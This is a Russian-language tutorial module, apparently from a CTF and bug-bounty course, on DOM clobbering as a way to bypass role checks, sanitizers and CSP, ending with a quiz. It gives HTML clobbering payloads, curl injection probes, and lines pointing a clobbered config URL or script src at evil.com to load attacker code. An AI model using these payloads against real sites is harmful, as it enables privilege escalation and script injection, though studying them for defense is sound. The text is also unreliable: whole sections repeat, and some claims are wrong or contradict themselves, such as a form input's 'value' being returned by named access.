---
id: web-dom-clobbering
title: "DOM clobbering: подмена глобальных переменных через HTML"
category: web
parent: web-same-origin-cors
difficulty: hard
order: 4
tags: [dom-clobbering, xss, html, sanitizer, csp, client-side]
prerequisites: [web-xss, web-same-origin-cors]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как без JavaScript переопределить window-переменные через HTML-элементы и обойти проверки, санитайзеры и CSP."
---

Иногда XSS-фильтр или CSP запрещают `<script>`, но **разрешают HTML**. DOM clobbering — это техника, при которой обычные HTML-элементы (`<img id=...>`, `<form name=...>`, `<a id=...>`) «затирают» глобальные переменные и свойства DOM. Приложение доверяет своей же переменной, а её значение подменил атакующий — и логика ломается без единой строки JS. Это ключевой кирпич в цепочках обхода CSP и санитайзеров (см. `web-csp-bypass`, `web-mxss`).

## Теория: named access — почему `window` видит ваши теги

В браузере работает механизм **named access**: элемент с атрибутом `id` (или `<form>`/`<img>`/`<embed>`/`<object>` с `name`) становится доступен как свойство `window` и `document` по своему имени.

```html
<img id="config">
<script>
  console.log(config);        // <img id="config">  (элемент, а не ваша переменная!)
  console.log(window.config); // то же самое
</script>
```

Если в приложении есть переменная `config`, объявленная **не** через `let`/`const`/`var` (например, это было `window.config` или необъявленное чтение `config`), то HTML-элемент `id="config"` перекроет её. Порядок важен: `window.config = {...}` в скрипте после парсинга тега уже перезапишет, но если скрипт читает `config` **до** присваивания (или переменная вообще не инициализируется) — выигрывает элемент.

Особенности:
- `id` перебивает `name`, но если есть **два** элемента с одинаковым `name`, браузер создаёт `HTMLCollection` (массивоподобный объект) — это полезно, чтобы получить объект, похожий на массив.
- Вложенные `form.elements` и `document.forms` тоже участвуют: `<form id=x><input name=y>` даёт `x.y` → элемент.
- Свойства вроде `document.body`, `document.forms`, `document.cookie` **нельзя** перебить напрямую, но можно создать `document.forms`-подобные конструкции через `id="forms"`? — нет, эти встроенные свойства защищены.

## Теория: что можно «клобберить»

| Цель в коде | HTML-пейлоад | Результат |
|-------------|--------------|-----------|
| `window.foo` | `<a id=foo>` | HTMLElement |
| `foo.bar` | `<a id=foo><a id=foo name=bar>` (два элемента) | HTMLCollection, у которого `[0]` — первый |
| `foo.toString()` | два `<a id=foo>` | строка `[object HTMLCollection]`? — нет, нужен `toString` override |
| `document.getElementById` | нельзя (встроенный метод) | — |

Часто нужен именно **HTMLCollection**, потому что многие проверки делают `x.length`, `x[0]`, `String(x)`. Создать её можно дублируя `name` внутри `form`:

```html
<form id="x">
  <input name="y">
  <input name="y">
</form>
<!-- x.y -> RadioNodeList/HTMLCollection длины 2 -->
```

## Теория: clobbering для обхода санитайзеров и проверок

Классические сценарии:

1. **Обход проверки конфигурации.** Код: `if (window.config && window.config.isAdmin) ...`. Атакующий, у которого есть HTML-инъекция (но не JS), ставит `<img id=config name=isAdmin>` → `config.isAdmin` теперь truthy (элемент). Проверка проходит.
2. **Перехват функции/URL.** `var url = document.getElementById('next').value` — если `getElementById` возвращает ваш элемент с `value`, вы управляете переходом.
3. **CSP-bypass через DOM.** Sanitizer (DOMPurify) может пропустить `id`/`name`, а приложение использует глобальную переменную в опасном sink — clobbering превращает HTML-инъекцию в XSS-эквивалент (см. `web-csp-advanced`).

Важно: clobbering сам по себе не исполняет JS. Это **примитив подмены данных**, который надо дотащить до sink (eval, innerHTML, location, fetch).

## Инструменты и команды

Проверять clobbering удобно в DevTools Console. Создайте элемент и посмотрите, что вернёт имя:

```js
// в консоли на целевой странице
document.body.innerHTML += '<a id="foo">x</a>';
console.log(typeof window.foo, window.foo); // "object", <a id="foo">
```

Автоматизировать поиск — расширение **DOM Invader** (Burp): оно подставляет clobbering-пейлоады в параметры и показывает, где значение влияет на DOM-sink. Аналог — ручной перебор.

Проверить, попадает ли инъекция в HTML без санитайза:

```bash
curl -s 'https://target.local/search?q=<a id=x>' | grep -o '<a id=x>'
```

Если тег вернулся как есть — HTML-инъекция возможна; далее проверяйте, использует ли JS глобальную переменную `x`.

## Разобранный пример: clobbering ломает проверку роли

Допустим, на странице есть код:

```html
<script>
  // проверяем, админ ли пользователь по глобальной переменной
  if (window.userRole) { showAdminPanel(); }
</script>
```

и возможность вставить HTML в профиль (`<img id=userRole>`). Санитайзер убирает `<script>`, но `id` разрешает.

Шаг 1. Подтверждаем, что HTML проходит фильтр:

```bash
curl -s 'https://target.local/profile' --data 'bio=<img id=userRole src=x onerror=1>' \
  -b 'session=me' | grep -o 'id=userRole'
```

Шаг 2. Открываем страницу — `window.userRole` теперь элемент, проверка truthy → админ-панель открылась. В отчёте фиксируем: HTML-инъекция + использование глобальной переменной = повышение привилегий без JS.

## Разобранный пример: clobbering в цепочке CSP-bypass

CSP: `script-src 'self'`. Прямой `<script>` запрещён, но inline HTML разрешён. Приложение содержит:

```html
<script src="/app.js"></script>
```

а `/app.js` делает `document.write('<a href=' + redirectUrl + '>...')`. Если `redirectUrl` — глобальная, а вы клобберите её через `<a id=redirectUrl>`, можно подставить `javascript:` или внешний URL. Комбинируйте clobbering с **script gadgets** (существующий код на странице, читающий вашу переменную) — это ядро обхода строгого CSP (см. `web-csp-advanced`).

## Частые ошибки

- **Путать clobbering с XSS.** Это не исполнение кода, а подмена данных. Без sink это «просто HTML».
- **Забывать про порядок.** Если скрипт присваивает переменную после парсинга вашего тега — выигрывает скрипт, clobbering не сработает.
- **Пытаться перебить встроенные свойства.** `document.body`, `location`, `cookie` так не перебить.
- **Игнорировать `id` vs `name`.** Для `HTMLCollection` нужны дубли `name` внутри `form`, а не просто два `id`.
- **Не проверять санитайзер.** DOMPurify по умолчанию чистит `id`/`name` в некоторых конфигурациях — тестируйте реальную версию.

## DOM clobbering в современных фреймворках

Классический DOM clobbering опирается на «named access»: браузер создаёт глобальные переменные для элементов с `id`/`name`. Современные фреймворки (React, Vue, Angular) часто читают из `window` и `document` значения, которые можно подменить через HTML. Если приложение доверяет глобальной переменной (например, `window.config` или `window.user`), а вы можете внедрить HTML, — вы подменяете её.

```html
<!-- подменяем глобальную config через named access -->
<form id="config"><input name="apiUrl" value="https://evil.com"></form>
<!-- теперь window.config.apiUrl === "https://evil.com" (в некоторых движках) -->
```

Особенно эффективно в связке с **DOM XSS**: clobbering может обойти проверки, которые выглядят надёжными, но читают данные из DOM. Проверяйте, не читает ли код `window.<name>`, `document.<name>` или `document.all`.

## Связка с prototype pollution

DOM clobbering и prototype pollution дополняют друг друга. Clobbering даёт подконтрольный объект там, где ожидается конфиг; prototype pollution — подконтрольные свойства там, где ожидается чистая структура. Вместе они ломают «защищённые» механизмы: например, загрязнение `Object.prototype` может заставить проверку `if (obj.isAdmin)` вернуть истину, а clobbering — подставить сам объект.

```html
<!-- clobbering для подмены глобального объекта -->
<a id="defaultConfig"></a>
<a id="defaultConfig" name="url" href="https://evil.com"></a>
```

## Инструменты и приёмы

- **Поиск sink'ов**: грепните JS на `window.`, `document.`, `document.all`, `getElementById(...).innerHTML`.
- **Тест**: внедрите `<form id=x>`, `<img name=y>`, `<a id=z>` и проверьте значения глобальных переменных в консоли.
- **Связка**: комбинируйте с DOM XSS и prototype pollution.

```bash
# ищем чтение из window/document в бандлах
katana -u https://t -jc -silent | grep -E '\.js' | while read u; do
  curl -s "$u" | grep -oE '(window|document)\.[a-zA-Z_]+' ; done | sort -u
```

## Что делать дальше / решение

Проверьте, какие глобальные переменные читает приложение, и можно ли их подменить через HTML (`id`/`name`). Если да — стройте цепочку: clobbering → обход проверки → DOM XSS или утечка. Доводите до артефакта (выполнение JS, отправка данных). Если прямого sink'а нет, комбинируйте с prototype pollution: clobbering подставляет объект, pollution — свойства. И фиксируйте, какую именно проверку удалось обойти.

## Разобранный пример: clobbering ломает проверку роли

Рассмотрим приложение, которое определяет роль из DOM. Код читает `window.currentUser.role` и, если это `admin`, показывает админ-панель.

```js
// уязвимый код
if (window.currentUser && window.currentUser.role === 'admin') {
  showAdminPanel();
}
```

Если можно внедрить HTML (через отражённый параметр или HTML-инъекцию), создаём элемент с `id="currentUser"` и полем `role`:

```html
<form id="currentUser"><input name="role" value="admin"></form>
```

Браузер (в ряде движков и контекстов) создаёт `window.currentUser`, ссылающийся на форму, а `window.currentUser.role` читает значение input — `admin`. Проверка обходится без XSS.

```bash
# 1. находим отражение HTML (без экранирования)
$ curl -s 'https://t/page?name=<form id=currentUser><input name=role value=admin></form>' | grep -o 'id=currentUser'
# 2. открываем страницу в браузере, в консоли:
#    window.currentUser.role  ->  "admin"
# 3. если UI показал админ-панель -> clobbering сработал
```

## Связка с CSP bypass

DOM clobbering часто используется для обхода CSP. Например, если код читает URL из DOM (`document.getElementById('x').src`) и загружает скрипт, clobbering подменяет `src` на ваш домен. Или если код доверяет «nonce», взятому из DOM, — можно подсунуть свой.

```html
<!-- подмена элемента, чей src читает код -->
<img id="loader" src="https://evil.com/x.js">
```

```bash
# ищем чтение src/href из DOM
katana -u https://t -jc -silent | grep -E '\.js' | while read u; do
  curl -s "$u" | grep -nE "getElementById\([^)]*\)\.(src|href)|window\.[a-z]+\.(src|href)"
done
```

Если найден такой sink и CSP разрешает домен атакующего (или `strict-dynamic` доверяет загруженному), получается обход.

## Что делать дальше / решение

Найдите глобальные переменные, которые читает приложение, и проверьте, можно ли их подменить через `id`/`name`. Если да — постройте PoC: clobbering обходит проверку → открывается админ-панель/DOM XSS. Комбинируйте с prototype pollution (подставить свойства) и CSP-bypass (подменить URL скрипта). Доводите до артефакта: выполнение JS, доступ к функции, отправка данных. И фиксируйте точную переменную, которую удалось подменить.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что делает механизм named access?"
  options:
    - "Элемент с `id`/`name` становится свойством `window`"
    - "Шифрует HTML"
    - "Отключает JavaScript"
    - "Удаляет cookies"
  answer: 0
  explanation: "Браузер открывает элементы по имени через `window[name]`/`document[name]`."
- question: "DOM clobbering сам по себе..."
  options:
    - "Исполняет произвольный JavaScript"
    - "Подменяет значение переменной, но не исполняет код"
    - "Обходит TLS"
    - "Меняет DNS"
  answer: 1
  explanation: "Это примитив подмены данных; для XSS нужен sink, читающий переменную."
- question: "Как получить `HTMLCollection` при clobbering?"
  options:
    - "Один `<img id=x>`"
    - "Два элемента с одинаковым `name` внутри `form`"
    - "`<style>`-тег"
    - "Cookie с тем же именем"
  answer: 1
  explanation: "Дубли `name` создают коллекцию (`form.x` → HTMLCollection/RadioNodeList)."
- question: "В каком случае clobbering НЕ сработает?"
  options:
    - "Если переменная объявлена через `let`/`const`"
    - "Если страница по HTTPS"
    - "Если стоит `HttpOnly`"
    - "Если включён HTTP/2"
  answer: 0
  explanation: "`let`/`const` создают лексическую привязку, которую `window`-элемент не перебивает."
- question: "Зачем clobbering используют в связке с CSP-bypass?"
  options:
    - "Чтобы ускорить загрузку"
    - "Чтобы подменить данные, которые читает существующий (script gadget) код"
    - "Чтобы отключить CSP-заголовок"
    - "Чтобы поставить cookie"
  answer: 1
  explanation: "HTML-инъекция + script gadget на странице = исполнение в обход запрета inline-скриптов."
```

## Где пригодится

- **CTF (Web):** задачи, где фильтр режет `<script>`, но оставляет HTML; clobbering — путь к «XSS без XSS».
- **Bug bounty:** HTML-инъекция, которую разработчики считают безобидной, часто эскалируется через clobbering.
- **Пентест:** анализ SPA и санитайзеров; поиск глобальных переменных, читаемых из DOM.
- **Работа (AppSec/Dev):** понимание, почему «санитизировать теги» недостаточно — нужно запрещать `id`/`name` и не полагаться на глобальные переменные.
